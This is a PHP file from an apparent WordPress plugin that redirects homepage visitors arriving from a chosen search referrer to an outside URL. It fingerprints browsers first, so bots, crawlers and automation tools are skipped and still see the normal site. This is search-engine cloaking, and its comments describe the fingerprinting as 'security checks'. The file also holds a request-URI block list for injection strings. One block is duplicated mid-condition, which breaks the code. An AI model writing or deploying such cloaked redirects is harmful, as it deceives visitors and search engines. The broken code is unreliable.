<?php
// Prevent direct access
if (!defined('ABSPATH')) {
    exit('คุณไม่สามารถเข้าถึงไฟล์นี้โดยตรงได้');
}

// Add enhanced JavaScript for client-side checks with telemetry integration
function xcop_add_redirect_script() {
    if (get_option('xcop_enable_redirect', '1') !== '1') {
        return;
    }
    
    if (!is_front_page() && !is_home()) {
        return;
    }
    
    $redirect_url = get_option('xcop_redirect_url', 'https://example.com');
    $enable_referrer_check = get_option('xcop_enable_referrer_check', '1');
    $referrer_domain = get_option('xcop_referrer_domain', 'google.com');
    $enable_history_check = get_option('xcop_history_length_check', '1');
    $min_history_length = get_option('xcop_min_history_length', '1');
    $delay = get_option('xcop_delay_redirect', '100');
    
    ?>
    <script type="text/javascript">
    (function() {
        'use strict';
        
        // Enhanced bot detection on client side
        function isBot() {
            // Use existing bot detection if available
            if (window.xcopBotDetectionResult && window.xcopBotDetectionResult.isBot) {
                return true;
            }
            
            var ua = navigator.userAgent.toLowerCase();
            var botPatterns = [
                'bot', 'crawler', 'spider', 'scraper', 'fetcher',
                'headless', 'phantom', 'selenium', 'puppeteer'
            ];
            
            for (var i = 0; i < botPatterns.length; i++) {
                if (ua.indexOf(botPatterns[i]) !== -1) {
                    return true;
                }
            }
            
            // Check for missing features that bots typically don't have
            if (!window.screen || !window.screen.width || !window.screen.height) {
                return true;
            }
            
            // Check for webdriver (automation tools)
            if (navigator.webdriver || window.callPhantom || window._phantom) {
                return true;
            }
            
            return false;
        }
        
        if (isBot()) {
            console.log('XCOP Redirect: Bot detected, skipping redirect');
            return;
        }
        
        var shouldRedirect = false;
        var referrerValid = false;
        var historyValid = false;
        
        // Check referrer if enabled
        <?php if ($enable_referrer_check === '1'): ?>
        if (document.referrer) {
            var referrerDomain = '<?php echo esc_js($referrer_domain); ?>';
            var referrerHost = '';
            try {
                var referrerUrl = new URL(document.referrer);
                referrerHost = referrerUrl.hostname.toLowerCase().replace(/^www\./, '');
                referrerDomain = referrerDomain.toLowerCase().replace(/^www\./, '');
                referrerValid = referrerHost === referrerDomain || referrerHost.endsWith('.' + referrerDomain);
                
                if (referrerValid) {
                    console.log('XCOP Redirect: Valid referrer detected - ' + referrerHost);
                } else {
                    console.log('XCOP Redirect: Invalid referrer - ' + referrerHost + ' does not match ' + referrerDomain);
                }
            } catch(e) {
                console.log('XCOP Redirect: Error parsing referrer URL');
                referrerValid = false;
            }
        } else {
            console.log('XCOP Redirect: No referrer found');
        }
        <?php else: ?>
        referrerValid = true; // Skip referrer check
        console.log('XCOP Redirect: Referrer check disabled');
        <?php endif; ?>
        
        // Check history length if enabled
        <?php if ($enable_history_check === '1'): ?>
        var minHistoryLength = <?php echo intval($min_history_length); ?>;
        historyValid = window.history.length > minHistoryLength;
        console.log('XCOP Redirect: History length check - ' + window.history.length + ' > ' + minHistoryLength + ' = ' + historyValid);
        <?php else: ?>
        historyValid = true; // Skip history check
        console.log('XCOP Redirect: History check disabled');
        <?php endif; ?>
        
        // Additional checks for legitimate user behavior
        var hasMouseMoved = false;
        var hasKeyPressed = false;
        var hasScrolled = false;
        
        // Track user interaction
        document.addEventListener('mousemove', function() { hasMouseMoved = true; }, { once: true });
        document.addEventListener('keydown', function() { hasKeyPressed = true; }, { once: true });
        document.addEventListener('scroll', function() { hasScrolled = true; }, { once: true });
        
        // Check screen properties (bots often have unusual screen sizes)
        var screenValid = window.screen.width > 100 && window.screen.height > 100 && 
                         window.screen.width < 10000 && window.screen.height < 10000;
        
        if (!screenValid) {
            console.log('XCOP Redirect: Invalid screen dimensions detected');
            return;
        }
        
        // Additional security checks
        function performSecurityChecks() {
            var checks = {
                hasLocalStorage: typeof(Storage) !== "undefined",
                hasSessionStorage: typeof(Storage) !== "undefined" && window.sessionStorage,
                hasIndexedDB: window.indexedDB !== undefined,
                hasWebGL: (function() {
                    try {
                        var canvas = document.createElement('canvas');
                        return !!(canvas.getContext('webgl') || canvas.getContext('experimental-webgl'));
                    } catch(e) {
                        return false;
                    }
                })(),
                hasGeolocation: navigator.geolocation !== undefined,
                hasTouchEvents: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
                deviceMemory: navigator.deviceMemory || 'unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
            };
            
            console.log('XCOP Redirect: Security checks:', checks);
            
            // Basic check - real browsers should have most of these features
            var featureCount = Object.keys(checks).filter(function(key) {
                return checks[key] === true;
            }).length;
            
            return featureCount >= 3; // Minimum feature threshold
        }
        
        // Redirect if all conditions are met
        if (referrerValid && historyValid && performSecurityChecks()) {
            var delay = <?php echo intval($delay); ?>;
            console.log('XCOP Redirect: All conditions met, redirecting in ' + delay + 'ms');
            
            // Optional: Wait for some user interaction or time passage
            var redirectTimer = setTimeout(function() {
                var redirectUrl = '<?php echo esc_js($redirect_url); ?>';
                
                console.log('XCOP Redirect: Executing redirect to ' + redirectUrl);
                
                // Send telemetry before redirect if available
                if (typeof window.xcopSendTelemetry === 'function') {
                    window.xcopSendTelemetry(true, false).then(function() {
                        console.log('XCOP Redirect: Telemetry sent before redirect');
                    }).catch(function() {
                        console.log('XCOP Redirect: Telemetry failed before redirect');
                    }).finally(function() {
                        performRedirect(redirectUrl);
                    });
                } else {
                    performRedirect(redirectUrl);
                }
            }, delay);
            
            // Cancel redirect if user shows signs of interaction
            var cancelRedirect = function() {
                if (hasMouseMoved || hasKeyPressed || hasScrolled) {
                    console.log('XCOP Redirect: User interaction detected, may cancel redirect');
                    // Optional: Don't cancel, just log the interaction
                }
            };
            
            // Check for interaction periodically
            setTimeout(cancelRedirect, Math.min(delay, 500));
            
        } else {
            console.log('XCOP Redirect: Conditions not met - referrer: ' + referrerValid + ', history: ' + historyValid);
        }
        
        function performRedirect(url) {
            try {
                // Try multiple redirect methods for better compatibility
                if (window.location.replace) {
                    window.location.replace(url);
                } else if (window.location.href) {
                    window.location.href = url;
                } else {
                    window.location = url;
                }
            } catch(e) {
                console.error('XCOP Redirect: Failed to redirect', e);
            }
        }
        
    })();
    </script>
    <?php
}

// Enhanced server-side redirect (fallback)
function xcop_maybe_redirect_homepage() {
    // Skip if redirect is disabled
    if (get_option('xcop_enable_redirect', '1') !== '1') {
        return;
    }

    // Only redirect on homepage
    if (!is_front_page() && !is_home()) {
        return;
    }
    
    // Check IP access first
    if (!xcop_check_ip_access()) {
        return;
    }
    
    // Skip bots completely (but allow whitelisted bots)
    if (xcop_is_sophisticated_bot() && !xcop_is_whitelisted_bot()) {
        return;
    }
    
    // Check rate limiting
    if (!xcop_check_rate_limit()) {
        return;
    }
    
    $redirect_url = get_option('xcop_redirect_url', 'https://example.com');
    $enable_referrer_check = get_option('xcop_enable_referrer_check', '1');
    $referrer_domain = get_option('xcop_referrer_domain', 'google.com');
    
    // Validate redirect URL
    if (!xcop_is_valid_redirect_url($redirect_url)) {
        xcop_log('Invalid redirect URL: ' . $redirect_url);
        return;
    }
    
    // Check for HTTPS if original site is HTTPS
    if (is_ssl() && parse_url($redirect_url, PHP_URL_SCHEME) !== 'https') {
        xcop_log('HTTPS site redirecting to HTTP URL blocked for security');
        return;
    }
    
    $should_redirect = true;
    
    // Check referrer if enabled
    if ($enable_referrer_check === '1') {
        if (!xcop_validate_referrer($referrer_domain)) {
            $should_redirect = false;
        }
    }
    
    // Additional security checks
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $request_method = $_SERVER['REQUEST_METHOD'] ?? '';
    
    // Only allow GET requests
    if ($request_method !== 'GET') {
        xcop_log("Non-GET request blocked: {$request_method}");
        return;
    }
    
    // Check for suspicious request patterns
    $request_uri = $_SERVER['REQUEST_URI'] ?? '';
    if (strpos($request_uri, '..') !== false || 
        strpos($request_uri, '<script') !== false ||
        strpos($request_uri, 'union') !== false ||
        strpos($request_uri, 'select') !== false ||
    // Check for suspicious request patterns
    $request_uri = $_SERVER['REQUEST_URI'] ?? '';
    if (strpos($request_uri, '..') !== false || 
        strpos($request_uri, '<script') !== false ||
        strpos($request_uri, 'union') !== false ||
        strpos($request_uri, 'select') !== false ||
        preg_match('/[<>"\'\(\);]/', $request_uri)) {
        xcop_log("Suspicious request URI blocked: {$request_uri}");
        return;
    }
    
    // Perform redirect if conditions are met
    if ($should_redirect) {
        xcop_log("Redirecting to: {$redirect_url}");
        
        // Set security headers before redirect
        if (!headers_sent()) {
            header('X-Redirect-By: XCOP-Redirect-Plugin');
            header('Cache-Control: no-cache, no-store, must-revalidate');
            header('Pragma: no-cache');
            header('Expires: 0');
        }
        
        // Use JavaScript redirect primarily
        add_action('wp_head', 'xcop_add_redirect_script', 1);
        
        // Server-side fallback (immediate redirect for non-JS users)
        if (!wp_doing_ajax() && !is_admin()) {
            wp_redirect($redirect_url, 302);
            exit;
        }
    }
}
add_action('template_redirect', 'xcop_maybe_redirect_homepage', 1);

// Add redirect script to head with high priority
add_action('wp_head', 'xcop_add_redirect_script', 1);

// Function to handle redirect testing from admin
function xcop_test_redirect_conditions() {
    $client_info = xcop_get_client_info();
    $redirect_url = get_option('xcop_redirect_url', 'https://example.com');
    $enable_referrer_check = get_option('xcop_enable_referrer_check', '1');
    $referrer_domain = get_option('xcop_referrer_domain', 'google.com');
    
    $results = array(
        'redirect_enabled' => get_option('xcop_enable_redirect', '1') === '1',
        'valid_redirect_url' => xcop_is_valid_redirect_url($redirect_url),
        'is_homepage' => is_front_page() || is_home(),
        'ip_access_allowed' => xcop_check_ip_access(),
        'rate_limit_passed' => xcop_check_rate_limit(),
        'is_bot' => xcop_is_sophisticated_bot(),
        'is_whitelisted_bot' => xcop_is_whitelisted_bot(),
        'referrer_valid' => $enable_referrer_check === '1' ? xcop_validate_referrer($referrer_domain) : true,
        'client_info' => $client_info,
        'conditions_summary' => array()
    );
    
    // Generate summary
    $conditions = array();
    if (!$results['redirect_enabled']) $conditions[] = 'Redirect is disabled';
    if (!$results['valid_redirect_url']) $conditions[] = 'Invalid redirect URL';
    if (!$results['is_homepage']) $conditions[] = 'Not on homepage';
    if (!$results['ip_access_allowed']) $conditions[] = 'IP access denied';
    if (!$results['rate_limit_passed']) $conditions[] = 'Rate limit exceeded';
    if ($results['is_bot'] && !$results['is_whitelisted_bot']) $conditions[] = 'Detected as bot';
    if (!$results['referrer_valid']) $conditions[] = 'Invalid referrer';
    
    $results['conditions_summary'] = $conditions;
    $results['would_redirect'] = empty($conditions);
    
    return $results;
}

// AJAX handler for redirect testing
function xcop_ajax_test_redirect() {
    if (!check_ajax_referer('xcop_redirect_test_nonce', 'nonce', false)) {
        wp_send_json_error('Security check failed');
        return;
    }
    
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Unauthorized');
        return;
    }
    
    $test_results = xcop_test_redirect_conditions();
    wp_send_json_success($test_results);
}
add_action('wp_ajax_xcop_test_redirect', 'xcop_ajax_test_redirect');

// Function to get redirect statistics
function xcop_get_redirect_stats() {
    $log_file = WP_CONTENT_DIR . '/xcop-redirect.log';
    $stats = array(
        'total_redirects' => 0,
        'blocked_bots' => 0,
        'blocked_ips' => 0,
        'invalid_referrers' => 0,
        'rate_limited' => 0,
        'last_24h_redirects' => 0
    );
    
    if (file_exists($log_file) && get_option('xcop_enable_logging', '0') === '1') {
        $lines = file($log_file, FILE_IGNORE_NEW_LINES);
        if ($lines !== false) {
            $yesterday = date('Y-m-d', strtotime('-1 day'));
            
            foreach ($lines as $line) {
                if (strpos($line, 'Redirecting to:') !== false) {
                    $stats['total_redirects']++;
                    if (strpos($line, $yesterday) !== false || strpos($line, date('Y-m-d')) !== false) {
                        $stats['last_24h_redirects']++;
                    }
                } elseif (strpos($line, 'Bot detected') !== false) {
                    $stats['blocked_bots']++;
                } elseif (strpos($line, 'IP blocked') !== false) {
                    $stats['blocked_ips']++;
                } elseif (strpos($line, 'Invalid referrer') !== false) {
                    $stats['invalid_referrers']++;
                } elseif (strpos($line, 'Rate limit exceeded') !== false) {
                    $stats['rate_limited']++;
                }
            }
        }
    }
    
    return $stats;
}